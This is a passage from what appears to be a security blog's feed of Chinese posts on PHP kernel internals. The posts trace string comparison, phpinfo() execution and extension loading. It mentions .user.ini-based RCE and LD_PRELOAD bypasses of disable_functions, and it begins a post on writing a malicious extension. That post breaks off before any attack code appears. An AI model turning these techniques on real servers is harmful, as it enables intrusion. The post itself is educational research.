(Z_ISREF_P(op1)) &#123;</span><br><span class="line">op1 = Z_REFVAL_P(op1);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_ISREF_P(op2)) &#123;</span><br><span class="line">op2 = Z_REFVAL_P(op2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_P(op1) == IS_OBJECT</span><br><span class="line"> &amp;&amp; Z_TYPE_P(op2) == IS_OBJECT</span><br><span class="line"> &amp;&amp; Z_OBJ_P(op1) == Z_OBJ_P(op2)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_TYPE_P(op1) == IS_OBJECT) &#123;</span><br><span class="line"><span class="keyword">return</span> Z_OBJ_HANDLER_P(op1, compare)(op1, op2);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_TYPE_P(op2) == IS_OBJECT) &#123;</span><br><span class="line"><span class="keyword">return</span> Z_OBJ_HANDLER_P(op2, compare)(op1, op2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!converted) &#123;</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_P(op1) &lt; IS_TRUE) &#123;</span><br><span class="line"><span class="keyword">return</span> zval_is_true(op2) ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_TYPE_P(op1) == IS_TRUE) &#123;</span><br><span class="line"><span class="keyword">return</span> zval_is_true(op2) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_TYPE_P(op2) &lt; IS_TRUE) &#123;</span><br><span class="line"><span class="keyword">return</span> zval_is_true(op1) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_TYPE_P(op2) == IS_TRUE) &#123;</span><br><span class="line"><span class="keyword">return</span> zval_is_true(op1) ? <span class="number">0</span> : <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">op1 = _zendi_convert_scalar_to_number(op1, &amp;op1_copy);</span><br><span class="line">op2 = _zendi_convert_scalar_to_number(op2, &amp;op2_copy);</span><br><span class="line"><span class="keyword">if</span> (EG(exception)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">/* to stop comparison of arrays */</span></span><br><span class="line">&#125;</span><br><span class="line">converted = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_TYPE_P(op1)==IS_ARRAY) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_TYPE_P(op2)==IS_ARRAY) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ZEND_ASSERT(<span class="number">0</span>);</span><br><span class="line">zend_throw_error(<span class="literal">NULL</span>, <span class="string">"Unsupported operand types"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本次进入case TYPE_PAIR(IS_STRING, IS_STRING)，然后跟进zendi_smart_strcmp()</p><h2 id="zend-operators-c-zendi-smart-strcmp"><a href="#zend-operators-c-zendi-smart-strcmp" class="headerlink" title="zend_operators.c zendi_smart_strcmp()"></a>zend_operators.c zendi_smart_strcmp()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((ret1 = is_numeric_string_ex(s1-&gt;val, s1-&gt;len, &amp;lval1, &amp;dval1, <span class="number">0</span>, &amp;oflow1)) &amp;&amp;</span><br><span class="line">(ret2 = is_numeric_string_ex(s2-&gt;val, s2-&gt;len, &amp;lval2, &amp;dval2, <span class="number">0</span>, &amp;oflow2)))</span><br></pre></td></tr></table></figure><p>跟进is_numeric_string_ex（）</p><h2 id="zend-operators-c-is-numeric-string-ex"><a href="#zend-operators-c-is-numeric-string-ex" class="headerlink" title="zend_operators.c _is_numeric_string_ex()"></a>zend_operators.c _is_numeric_string_ex()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Skip any whitespace</span></span><br><span class="line"><span class="comment"> * This is much faster than the isspace() function */</span></span><br><span class="line"><span class="keyword">while</span> (*str == <span class="string">' '</span> || *str == <span class="string">'\t'</span> || *str == <span class="string">'\n'</span> || *str == <span class="string">'\r'</span> || *str == <span class="string">'\v'</span> || *str == <span class="string">'\f'</span>) &#123;</span><br><span class="line">str++;</span><br><span class="line">length--;</span><br><span class="line">&#125;</span><br><span class="line">ptr = str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*ptr == <span class="string">'-'</span>) &#123;</span><br><span class="line">neg = <span class="number">1</span>;</span><br><span class="line">ptr++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (*ptr == <span class="string">'+'</span>) &#123;</span><br><span class="line">ptr++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ZEND_IS_DIGIT(*ptr)) &#123;</span><br><span class="line"><span class="comment">/* Skip any leading 0s */</span></span><br><span class="line"><span class="keyword">while</span> (*ptr == <span class="string">'0'</span>) &#123;</span><br><span class="line">ptr++;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* Count the number of digits. If a decimal point/exponent is found,</span></span><br><span class="line"><span class="comment"> * it's a double. Otherwise, if there's a dval or no need to check for</span></span><br><span class="line"><span class="comment"> * a full match, stop when there are too many digits for a long */</span></span><br><span class="line"><span class="keyword">for</span> (type = IS_LONG; !(digits &gt;= MAX_LENGTH_OF_LONG &amp;&amp; (dval || allow_errors == <span class="number">1</span>)); digits++, ptr++) &#123;</span><br><span class="line">check_digits:</span><br><span class="line"><span class="keyword">if</span> (ZEND_IS_DIGIT(*ptr)) &#123;</span><br><span class="line">tmp_lval = tmp_lval * <span class="number">10</span> + (*ptr) - <span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (*ptr == <span class="string">'.'</span> &amp;&amp; dp_or_e &lt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> process_double;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*ptr == <span class="string">'e'</span> || *ptr == <span class="string">'E'</span>) &amp;&amp; dp_or_e &lt; <span class="number">2</span>) &#123;<span class="comment">//检查科学计数法</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *e = ptr + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*e == <span class="string">'-'</span> || *e == <span class="string">'+'</span>) &#123;</span><br><span class="line">ptr = e++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ZEND_IS_DIGIT(*e)) &#123;</span><br><span class="line"><span class="keyword">goto</span> process_double;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是这个函数开始对字符串进行的过滤，过滤掉那些对字符串转数字有影响的字符。过滤完成以后再检查小数的位数，因为检查到了e，然后再检查后面的数字，其中<code>local_dval = zend_strtod(str, &amp;ptr);</code>很关键，我们可以看看zned_strtod()的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (se)</span><br><span class="line">*se = (<span class="keyword">char</span> *)s;<span class="comment">//此处将后面的数字转化为字符</span></span><br><span class="line"><span class="keyword">return</span> sign ? -dval(&amp;rv) : dval(&amp;rv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在两个函数都执行完这一套流程后，就进行比较，最后返回true</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php内核学习-2&quot;&gt;&lt;a href=&quot;#php内核学习-2&quot; class=&quot;headerlink&quot; title=&quot;php内核学习(2)&quot;&gt;&lt;/a&gt;php内核学习(2)&lt;/h1&gt;&lt;p&gt;开始的时候，找函数下断点找得够呛，网上查资料想起来，php内核的操作符都在zen
      
    
    </summary>
    
    
    
      <category term="web" scheme="https://knightswd.github.io/tags/web/"/>
    
      <category term="PHP内核" scheme="https://knightswd.github.io/tags/PHP%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>php内核学习(一)</title>
    <link href="https://knightswd.github.io/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/"/>
    <id>https://knightswd.github.io/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/</id>
    <published>2020-03-12T03:17:08.000Z</published>
    <updated>2020-03-12T05:05:07.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php内核学习-1"><a href="#php内核学习-1" class="headerlink" title="php内核学习(1)"></a>php内核学习(1)</h1><p>PG：存放全局变量</p><p>SG：存放SAPI所需的全局变量</p><p>CG：存放compiler需要的全局变量</p><p>EG：存放执行器需要的全局变量</p><p>其他的前置知识可以看我之前的先知文章<code>https://xz.aliyun.com/t/7330</code></p><p>如果我们在php中执行phpinfo()，php底层到底是怎么处理的呢，毫无疑问，第一步肯定是先输入然后执行，再输出。那底层究竟做了什么呢。</p><p>新建一个php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>现在来看下他的处理过程吧</p><h2 id="调用函数栈"><a href="#调用函数栈" class="headerlink" title="调用函数栈"></a>调用函数栈</h2><p>执行函数顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php_output_op output.c:1073</span><br><span class="line">php_output_write output.c:252</span><br><span class="line">php_output_stack_pop output.c:1234</span><br><span class="line">php_output_end output.c:325</span><br><span class="line">zif_phpinfo info.c:1257  &#x2F;&#x2F;</span><br><span class="line">ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER zend_vm_execute.h:1240&#x2F;&#x2F;如果是自定义，调用自定义函数，如果是系统函数，则调用系统函数</span><br><span class="line">execute_ex zend_vm_execute.h:51845&#x2F;&#x2F;使用while循环执行文件中的函数</span><br><span class="line">zend_execute zend_vm_execute.h:56139&#x2F;&#x2F;zend虚拟机执行，将文件中的数据pull到栈上去</span><br><span class="line">zend_execute_scripts zend.c:1661&#x2F;&#x2F;按照prepend_file,primary_file,append_file来顺序编译，执行文件</span><br><span class="line">php_execute_script main.c:2584&#x2F;&#x2F;如果设置了auto_append_file，那么就将此文件加载进去目前执行的文件</span><br><span class="line">do_cli php_cli.c:956&#x2F;&#x2F;加载php文件路径，将文件信息加载进入zend_file_handle中</span><br><span class="line">main php_cli.c:1351&#x2F;&#x2F;加载php.ini进入PG</span><br><span class="line">start 0x00007fff70c1d7fd</span><br><span class="line">start 0x00007fff70c1d7fd</span><br></pre></td></tr></table></figure><h3 id="一、加载汇编"><a href="#一、加载汇编" class="headerlink" title="一、加载汇编"></a>一、加载汇编</h3><p>进入main函数入口</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/1.jpg" alt="img"></p><h3 id="二、进入main"><a href="#二、进入main" class="headerlink" title="二、进入main()"></a>二、进入main()</h3><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/2.jpg" alt="img"></p><p>这里具体初始化了哪些函数可以看下面sapi_module的结构体内容吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">sapi_module_struct</span> &#123;</span>  <span class="comment">// SAPI模块结构</span></span><br><span class="line">    <span class="keyword">char</span> *name; <span class="comment">// 应用层名称，比如cli,cgi等</span></span><br><span class="line">    <span class="keyword">char</span> *pretty_name; <span class="comment">// 应用层更易读的名字，比如cli对应的就是Command Line Interface</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> (*startup)(struct _sapi_module_struct *sapi_module); <span class="comment">// 当一个应用要调用php的时候，这个模块启动的时候会调用的函数</span></span><br><span class="line">    <span class="keyword">int</span> (*<span class="built_in">shutdown</span>)(struct _sapi_module_struct *sapi_module); <span class="comment">// 当一个应用要调用php的时候，这个模块结束的时候会调用的函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> (*activate)(<span class="keyword">void</span>); <span class="comment">// 在处理每个request的时候，激活需要调用的函数</span></span><br><span class="line">    <span class="keyword">int</span> (*deactivate)(<span class="keyword">void</span>); <span class="comment">// 在处理完每个request的时候，收尾时候要调用的函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> (*ub_write)(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">size_t</span> str_length); <span class="comment">// 这个函数告诉php如何输出数据</span></span><br><span class="line">    <span class="keyword">void</span> (*<span class="built_in">flush</span>)(<span class="keyword">void</span> *server_context); <span class="comment">// 提供给php的刷新缓存的函数指针</span></span><br><span class="line">    <span class="keyword">zend_stat_t</span> *(*get_stat)(<span class="keyword">void</span>); <span class="comment">// 用来判断要执行文件的权限，来判断是否有执行权限</span></span><br><span class="line">    <span class="keyword">char</span> *(*getenv)(<span class="keyword">char</span> *name, <span class="keyword">size_t</span> name_len); <span class="comment">// 获取环境变量的方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*sapi_error)(<span class="keyword">int</span> type, <span class="keyword">const</span> <span class="keyword">char</span> *error_msg, ...) ZEND_ATTRIBUTE_FORMAT(<span class="built_in">printf</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 错误处理方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> (*header_handler)(sapi_header_struct *sapi_header, sapi_header_op_enum op, sapi_headers_struct *sapi_headers); <span class="comment">// 这个函数会在我们调用header()的时候被调用</span></span><br><span class="line">    <span class="keyword">int</span> (*send_headers)(sapi_headers_struct *sapi_headers); <span class="comment">// 发送所有的header</span></span><br><span class="line">    <span class="keyword">void</span> (*send_header)(sapi_header_struct *sapi_header, <span class="keyword">void</span> *server_context); <span class="comment">// 单独发送某一个header</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> (*read_post)(<span class="keyword">char</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> count_bytes); <span class="comment">// 如何获取HTTP POST中的数据</span></span><br><span class="line">    <span class="keyword">char</span> *(*read_cookies)(<span class="keyword">void</span>);  <span class="comment">// 如何获取cookie中的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*register_server_variables)(zval *track_vars_array); <span class="comment">// 这个函数可以给$_SERVER中获取变量</span></span><br><span class="line">    <span class="keyword">void</span> (*log_message)(<span class="keyword">char</span> *message, <span class="keyword">int</span> syslog_type_int); <span class="comment">// 输出错误信息函数</span></span><br><span class="line">    <span class="keyword">double</span> (*get_request_time)(<span class="keyword">void</span>); <span class="comment">// 获取请求时间的函数</span></span><br><span class="line">    <span class="keyword">void</span> (*terminate_process)(<span class="keyword">void</span>);  <span class="comment">// <span class="doctag">TODO:</span> 调用exit的时候调用的方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *php_ini_path_override;  <span class="comment">// PHP的ini文件被复写了所复写的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*default_post_reader)(<span class="keyword">void</span>); <span class="comment">// 这里和前面的read_post有个差别，read_post负责如何获取POST数据，而这里的函数负责如何解析POST数据</span></span><br><span class="line">    <span class="keyword">void</span> (*treat_data)(<span class="keyword">int</span> arg, <span class="keyword">char</span> *str, zval *destArray); <span class="comment">// 对数据进行处理，比如进行安全过滤等。 default_post_reader/tread_data/input_filter是三个能对输入进行过滤和处理的函数</span></span><br><span class="line">    <span class="keyword">char</span> *executable_location; <span class="comment">// 执行的地理位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> php_ini_ignore; <span class="comment">// 是否不使用任何ini配置文件，比如php －n 就将这个位置设置为1</span></span><br><span class="line">    <span class="keyword">int</span> php_ini_ignore_cwd; <span class="comment">// 不在当前路径寻找php.ini</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> (*get_fd)(<span class="keyword">int</span> *fd); <span class="comment">// 获取执行文件的fd</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> (*force_http_10)(<span class="keyword">void</span>); <span class="comment">// 强制使用http1.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> (*get_target_uid)(<span class="keyword">uid_t</span> *); <span class="comment">// 获取执行程序的uid</span></span><br><span class="line">    <span class="keyword">int</span> (*get_target_gid)(<span class="keyword">gid_t</span> *); <span class="comment">// 获取执行程序的gid</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">int</span> <span class="params">(*input_filter)</span><span class="params">(<span class="keyword">int</span> arg, <span class="keyword">char</span> *var, <span class="keyword">char</span> **val, <span class="keyword">size_t</span> val_len, <span class="keyword">size_t</span> *new_val_len)</span></span>; <span class="comment">// 对输入进行过滤。比如将输入参数填充到自动全局变量$_GET, $_POST, $_COOKIE中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*ini_defaults)(HashTable *configuration_hash); <span class="comment">// 默认的ini配置</span></span><br><span class="line">    <span class="keyword">int</span> phpinfo_as_text; <span class="comment">// 是否打印phpinfo信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *ini_entries; <span class="comment">// 有没有附带的ini配置，比如使用php -d date.timezone=America/Adak,可以在命令行中设置时区</span></span><br><span class="line">    <span class="keyword">const</span> zend_function_entry *additional_functions; <span class="comment">// 每个SAPI模块特有的一些函数注册，比如cli的cli_get_process_title</span></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">int</span> <span class="params">(*input_filter_init)</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="do-cli"><a href="#do-cli" class="headerlink" title="do_cli()"></a>do_cli()</h3><p>这是整个默认配置加载完成后调用do_cli()，在此函数中，系统获取之前传入的文件名，然后将文件名加载进入zend_file_handle结构体的filename中。</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/3.jpg" alt="img"></p><p>而后会调用php_request_startup()来执行zend引擎初始化</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/4.jpg" alt="img"></p><h3 id="php-execute-script"><a href="#php-execute-script" class="headerlink" title="php_execute_script"></a>php_execute_script</h3><p>我们继续进入到php_execute_script()函数在此函数中将初始化文件</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/5.jpg" alt="img"></p><p>如果在php.ini中设置了auto_prepend_file则加载其设置的文件，也可以在,user.ini中设置。</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/6.jpg" alt="img"></p><p>在这些文件中，prepend_file_p是之前auto_prepend_file设置的文件，此处注意他们的顺序，进入到zend_execute_scripts()函数中去</p><h3 id="zend-execute-scripts"><a href="#zend-execute-scripts" class="headerlink" title="zend_execute_scripts()"></a>zend_execute_scripts()</h3><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/7.jpg" alt="img"></p><p>在此处使用了一个for循环，而循环文件到顺序就是之前加载的顺序，这里就可以解释上传漏洞中<code>.user.ini</code>照成的文件rce了，而在for循环中，先进入zend_compile_file()来编译函数，然后通过zend_execute()来执行前面编译完成的opcode。</p><h3 id="info-c"><a href="#info-c" class="headerlink" title="info.c"></a>info.c</h3><p>在zend_execute()中则一行，一行opcode来进行执行，当检测到phpinfo()时，判断phpinfo()是一个内置函数，于是调用<code>internal_function.handler()</code>来进行执行，然后就进入了info.c的<code>PHP_FUNCTION(phpinfo)</code>了，下面是phpinfo（）中的三个函数</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/8.jpg" alt="img"></p><h3 id="output-c"><a href="#output-c" class="headerlink" title="output.c"></a>output.c</h3><p>然后进入php_output_start_default()来进行初始化，进入php_print_info()来输出消息</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/12/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%80/9.jpg" alt="img"></p><p>以上就是整个php执行phpinfo()的全过程了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php内核学习-1&quot;&gt;&lt;a href=&quot;#php内核学习-1&quot; class=&quot;headerlink&quot; title=&quot;php内核学习(1)&quot;&gt;&lt;/a&gt;php内核学习(1)&lt;/h1&gt;&lt;p&gt;PG：存放全局变量&lt;/p&gt;
&lt;p&gt;SG：存放SAPI所需的全局变量&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
    
      <category term="web" scheme="https://knightswd.github.io/tags/web/"/>
    
      <category term="php内核" scheme="https://knightswd.github.io/tags/php%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>php自定义恶意扩展so编写过程</title>
    <link href="https://knightswd.github.io/2020/03/03/php%E8%87%AA%E5%AE%9A%E4%B9%89%E6%81%B6%E6%84%8F%E6%89%A9%E5%B1%95so%E7%BC%96%E5%86%99%E8%BF%87%E7%A8%8B/"/>
    <id>https://knightswd.github.io/2020/03/03/php%E8%87%AA%E5%AE%9A%E4%B9%89%E6%81%B6%E6%84%8F%E6%89%A9%E5%B1%95so%E7%BC%96%E5%86%99%E8%BF%87%E7%A8%8B/</id>
    <published>2020-03-03T12:08:51.000Z</published>
    <updated>2020-03-03T12:24:10.719Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php自定义恶意扩展so编写过程"><a href="#php自定义恶意扩展so编写过程" class="headerlink" title="php自定义恶意扩展so编写过程"></a>php自定义恶意扩展so编写过程</h1><h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p><code>LD_PRELOAD</code>是linux的环境变量，可以设置一个指定库的路径，常被用来Passby Disable_functions，本文将从php扩展和php内核的交互来解释php编写自定义扩展的整个过程</p><h2 id="0x02前置知识"><a href="#0x02前置知识" class="headerlink" title="0x02前置知识"></a>0x02前置知识</h2><p>php的生命周期有五个阶段：</p><p>1、模块初始化</p><blockquote><p>此阶段主要注册php和zend引擎的扩展，还有将常量注册到EG(zend_constants),全局变量注册到CG(auto_globals)，同时掉用php扩展的PHP_MINT()</p></blockquote><p>2、请求初始化</p><blockquote><p>初始化php脚本的基本执行环境，调用php扩展的PHP_RINT()</p></blockquote><p>3、执行php脚本</p><blockquote><p>将php编译成opcode码，然后再用zend引擎执行</p></blockquote><p>​    编译过程流程图：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/03/php%E8%87%AA%E5%AE%9A%E4%B9%89%E6%81%B6%E6%84%8F%E6%89%A9%E5%B1%95so%E7%BC%96%E5%86%99%E8%BF%87%E7%A8%8B/1.jpg" alt="img"></p><p>4、请求结束</p><blockquote><p>清理EG(symbol_table),销毁全局变量PG(http_globals),调用析构函数和各种扩展的RSHUTDOWN函数，关闭编译器和执行器，关闭内存管理器</p></blockquote><p>5、模块关闭</p><blockquote><p>清理持久化符号标，调用各扩展的MSHUTDOWN，清理扩展globals，注销扩展提供的函数</p></blockquote><p>php整个扩展的加载就在模块初始化阶段，而整个扩展的加载过程又有以下步骤</p><ul><li><p>使用dlopen()函数来打开so库文件，并返回句柄给dlsym()</p></li><li><p>dlsym()函数来获取动态库中<code>get_module()</code>函数地址</p></li><li><p>调用<code>get_module()</code>函数来获取扩展的<code>zend_module_entry</code>结构</p></li><li><p>zend api版本号检查，看是否是当前php版本下适用的扩展</p></li><li><p>注册扩展，将扩展添加到<code>module_registry</code>中</p></li><li><p>如果扩展有内部函数，将内部函数注册到EG(function_table)中</p></li></ul><h2 id="0x03扩展编写"><a href="#0x03扩展编写" class="headerlink" title="0x03扩展编写"></a>0x03扩展编写</h2><h3 id="1、编写config-m4"><a href="#1、编写config-m4" class="headerlink" title="1、编写config.m4"></a>1、编写config.m4</h3><p>Config.m4是扩展的编译配置文件，它被include到configure.in文件中，最终被autoconf编译为configure。</p><p>以下是一个简单的扩展配置模版：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP_ARG_ENABLE(扩展名称, <span class="keyword">for</span> mytest support,</span><br><span class="line">Make sure that the comment is aligned:</span><br><span class="line">[  --with-扩展名称             Include xxx support])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> test <span class="string">"$PHP_扩展名称"</span> != <span class="string">"no"</span>; then</span><br><span class="line">    PHP_NEW_EXTENSION(扩展名称, 源码文件列表, $ext_shared,, -DZEND_ENABLE_STATIC_TSRMLS_CACHE=<span class="number">1</span>)</span><br><span 